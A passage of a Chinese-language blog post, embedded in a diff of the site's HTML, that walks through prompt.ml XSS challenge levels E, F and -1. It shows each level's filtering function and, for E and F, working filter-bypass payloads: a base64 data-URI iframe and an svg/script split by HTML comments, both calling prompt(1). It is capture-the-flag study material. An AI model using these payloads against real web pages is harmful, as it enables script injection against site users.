class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-12"><a href="#答案-12" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Level-E"><a href="#Level-E" class="headerlink" title="Level E"></a>Level E</h3><hr>
+<h4 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-13"><a href="#答案-13" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;iframe/src="</span>a:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure>
+<p>把一些特殊字符和空格替换成了<code>_</code>，只能不出现它们；<code>//</code>和<code>任意字符:</code>被替换成<code>data:</code>，这里可以联想到<code>data:协议</code>。img标签不支持data:协议(也不支持javascript:伪协议)，改用<code>iframe</code>标签<br>但试的时候一直不行，不知道为什么<br>= = 发现了，是输入会转为大写的缘故，导致base64字符串不能正确解码，那问题来了，怎么找到一个base64编码后全是大写的答案？</p>
+<h3 id="Level-F"><a href="#Level-F" class="headerlink" title="Level F"></a>Level F</h3><hr>
+<h4 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-14"><a href="#答案-14" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Level 7的优化版，把<code>*</code>过滤了，那就把<code>/**/</code>换成<code>&lt;!----&gt;</code></p>
+<h3 id="Level-1-1"><a href="#Level-1-1" class="headerlink" title="Level -1"></a>Level -1</h3><hr>
+<h4 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// WORLD -1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strip off certain characters from breaking conditional statement</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[&#125;&lt;]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                                     \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                         \n\</span></span><br><span class="line"><span class="string">    if (history.length &gt; 1337) &#123;                                 \n\</span></span><br><span class="line"><span class="string">        // you can inject any code here                          \n\</span></span><br><span class="line"><span class="string">        // as long as it will be executed                        \n\</span></span><br><span class="line"><span class="string">        &#123;&#123;injection&#125;&#125;                                            \n\</span></span><br><span class="line"><span class="string">    &#125;                                                            \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                        \n\</span></span><br><span class="line"><span class="string">    '</span>.replace(<span class="string">'&#123;&#123;injection&#125;&#125;'</span>, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-15"><a href="#答案-15" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>做完Level F时看后面还有点了一下，结果网页中只有一个表情，没有题目，再往后点也是这样，猜测有隐藏题目，觉得是-1，试了下果然是 233 但是没啥用 不会做</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>整套题目做下来，感觉挺有意思的，考验更多的是一些奇淫技巧，你知道了就能做，不知道就做不出来，当然，一些基础要巩固，比如JSON之类的，明天学下相关的基础吧</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
